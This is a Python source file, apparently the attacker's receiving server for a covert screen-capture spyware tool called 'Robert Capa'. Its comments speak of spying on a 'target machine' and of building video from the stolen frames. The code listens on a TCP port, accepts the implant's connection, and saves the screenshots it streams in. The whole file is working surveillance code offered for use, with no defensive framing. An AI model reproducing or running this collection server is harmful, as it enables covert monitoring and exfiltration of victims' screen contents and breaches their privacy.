# All captured images will be sent to this server as bytes that will be reconverted into image
# and saved in the Image-Output folder. OSErrors may occur corrupting some files, but
# is not very significant considering that a total of 4 frames will be captured per second,
# losing two of them will not be so serious, but it depends on your situation.
# You can increase the fps number change the sleep_time value on Robert Capa.py, 0.1 means 10fps
# After capture the images and stop the espionage, you can make one video with the captured images
# to see what happening on your target machine executing the <> (make this)
import socket
from datetime import datetime
from os import mkdir, chdir
from shutil import rmtree
from PIL import Image
import io
import logging as log

_format = '%(msg)s'
log.basicConfig(level=log.INFO, format=_format)
# log.disable()  # Uncomment this line to disable the log messages

try:
    mkdir('Images_Output')
except OSError:
    try:
        rmtree('Images_Output')
        mkdir('Images_Output')
    except PermissionError:
        pass
chdir('Images_Output')

host = socket.gethostbyname(socket.gethostname())  # Your ipv4 address
port = 7562
buffer = 999999

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((host, port))
    log.info(f'The server is running... Host: {host} Port: {port}')
    s.listen()  # Wait the robert connect
    conn, addr = s.accept()
    with conn:
        log.info(f'Robert Capa connected! {addr} Waiting Files...')
        while True:
            try:
                filename = conn.recv(buffer).decode()
                filesize = conn.recv(buffer).decode()
                log.info(f'Receiving new file: {filename} Size: {int(int(filesize) / 1024)}Kb')
                bytes_read = conn.recv(buffer)
                im = Image.open(io.BytesIO(bytes_read))  # Convert bytes to image
                im.save(filename)
                log.info(f'{filename}: <Received at {str(datetime.now().time())[:8]}>')
            except ValueError:
                continue
            except OSError:
                log.info(f'Error, truncated image: {filename} has been ignored')
                continue
            except Exception as e:
                print(f'Error: {e}')
                print(f'\n\nFatal error: [{str(datetime.now().time())[:8]} Robert Capa was killed TT]')
                break
